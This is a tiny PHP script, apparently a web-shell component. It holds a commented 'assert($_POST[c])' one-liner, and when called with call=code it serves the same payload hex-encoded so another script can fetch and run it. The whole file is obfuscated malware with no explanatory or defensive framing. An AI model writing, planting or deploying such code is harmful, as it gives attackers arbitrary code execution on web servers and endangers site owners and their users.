<?php
//getcode.php    
//assert($_POST[c]);
$cmd=$_GET['call'];
if ($cmd=='code')  
   echo sprintf('61737365727428245f504f53545b635d293b');
?>
